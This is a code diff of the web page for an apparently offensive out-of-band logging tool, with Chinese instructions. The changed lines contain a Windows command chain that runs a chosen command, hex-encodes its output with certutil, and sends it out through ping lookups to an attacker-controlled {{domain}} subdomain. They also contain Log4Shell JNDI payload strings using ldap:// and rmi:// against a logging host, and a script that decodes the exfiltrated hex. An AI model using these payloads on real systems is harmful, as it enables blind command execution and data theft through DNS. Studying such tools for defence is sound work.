@@ -80,9 +80,8 @@
                         </code>
                     </div>
                     <br>
-                    <div class="callout callout-info">Windows:  
-                        <code>set CMD="这里填你的命令" && set /a _random=%RANDOM% * 9000 / 32768 + 1000
-                            echo %random% && %CMD% > execfile7 && certutil -encodehex -f execfile7 execfile7.txt 4 && (for /f "Delims=: Tokens=1-2" %a in ('findstr /n . execfile7.txt') do (for /f "Tokens=1-16" %c in ('echo %b')do ping -nc 1 %c%d%e%f%g%h%i%j%k%l%m%n%o%p%q%r.%a.%_random%.cmd.{{domain}})) && del execfile7 && del execfile7.txt
+                    <div class="callout callout-info">Windows:
+                        <code>这里填你的命令 1>resu.txt 2>&1 && certutil -encodehex -f resu.txt resuhex.txt 4 && for /f "Delims=: Tokens=1-2" %a in ('findstr /n . resuhex.txt') do (for /f "Tokens=1-24" %c in ('echo %b')do (ping -nc 1 %c%d%e%f%g%h%i%j%k%l%m%n%o%p%q%r%s%t%u%v%w%x%y%z.%a.%RANDOM%.cmd.{{domain}})) && del resu.txt && del resuhex.txt
                         </code>
                     </div>
                     <br>
@@ -93,9 +92,6 @@
                 </div>
             </div>
         </div>
-
-
-
 
         <!-- USAGE CARD -->
         <div class="container-fluid p-t-15">
@@ -136,8 +132,8 @@ connect to [1.2.3.4] from fbi.gov [127.0.0.1] 46958
 rmi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/
 ldap://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/
 路径后可以添加任何字符或留空 便于识别区分 如:
-${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/test}
-${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
+${jndi:ldap://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/test}
+${jndi:rmi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
 </pre>
                 </div>
             </div>
@@ -164,11 +160,15 @@ ${jndi:jndi://jndi.log.d48e48337471993e.com:5/{{domain.split('.')[0]}}/hello}
                         this.isdomainexpire = false
                     })
                 },
-                hex2string(hexstring){
-                    const hexArray = hexstring.match(/.{1,2}/g); // 将16进制字符串拆分成数组
-                    const charArray = hexArray.map(hex => String.fromCharCode(parseInt(hex, 16))); // 将每个16进制数转换为字符
-                    const result = charArray.join(""); // 将字符数组合并成一个字符串
-                    return result;
+                hex2string(hexString){
+                    // Convert hexadecimal string to byte array
+                    const byteArray = new Uint8Array(hexString.match(/[\da-f]{2}/gi).map(function (h) {
+                    return parseInt(h, 16);
+                    }));
+                    // Decode byte array from GB2312 to UTF-8
+                    const decoder = new TextDecoder("gbk");
+                    const utf8String = decoder.decode(byteArray);
+                    return utf8String
                 },
                 getCmdresp(){
                     var _cmdrecords=[],randomKeys ={}
